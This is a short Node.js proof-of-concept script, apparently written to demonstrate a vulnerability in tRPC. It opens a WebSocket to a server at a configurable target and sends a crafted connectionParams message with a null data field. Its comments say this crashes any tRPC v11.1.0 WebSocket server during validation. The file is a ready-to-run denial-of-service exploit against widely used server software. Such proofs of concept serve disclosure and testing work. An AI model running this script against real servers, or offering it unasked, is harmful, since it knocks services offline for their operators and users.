#!/usr/bin/env node

// These malicious connection params will crash any tRPC v11.1.0 WebSocket server on validation
const MALICIOUS_CONNECTION_PARAMS = JSON.stringify({
  method: "connectionParams",
  data: { invalidConnectionParams: null },
});

// Open a connection to the target
const target = "ws://localhost:3000?connectionParams=1";
console.log(`Opening a WebSocket to ${target}`);
const socket = new WebSocket(target);

// Wait for the connection to be established
socket.addEventListener("open", () => {
  console.log("WebSocket established!");

  // Sends a message to the WebSocket server.
  console.log(`Sending malicious connectionParams`);
  socket.send(MALICIOUS_CONNECTION_PARAMS);
  console.log(`Done!`);
});

// Handle errors
socket.addEventListener("error", () => console.log("Error opening WebSocket"));
